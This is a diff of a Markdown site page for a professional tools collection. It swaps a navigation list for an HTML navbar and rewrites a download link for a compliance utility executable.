@@ -6,14 +6,12 @@ layout: default
 
 Tools, templates, and resources for professionals, curated for clarity and convenience.
 
----
-
-## 🔗 Quick Navigation
-
-- [Home](#welcome-to-enstera)
-- [Tools](#tools)
-- [Resources](#resources)
-- [Downloads](#downloads)
+<!-- Simulated Navbar -->
+<div style="text-align:center; margin-bottom: 2em;">
+  <a href="#tools" style="margin: 0 15px;">🛠 Tools</a>
+  <a href="#resources" style="margin: 0 15px;">📘 Resources</a>
+  <a href="#downloads" style="margin: 0 15px;">📥 Downloads</a>
+</div>
 
 ---
 
@@ -42,7 +40,7 @@ Easy-to-follow guides and templates:
 **🖥 Compliance Tool v1.0**  
 A lightweight utility to simplify routine filing tasks.
 
-[⬇️ Download EXE (v1.0)]([https://github.com/ensTera/ensTera.github.io/releases/download/1.0.0.0/194T.Data.Extractor.exe])
+[⬇️ Download EXE (v1.0)](https://github.com/enstera/enstera.github.io/releases/download/v1.0/yourfile.exe)
 
 ---
 
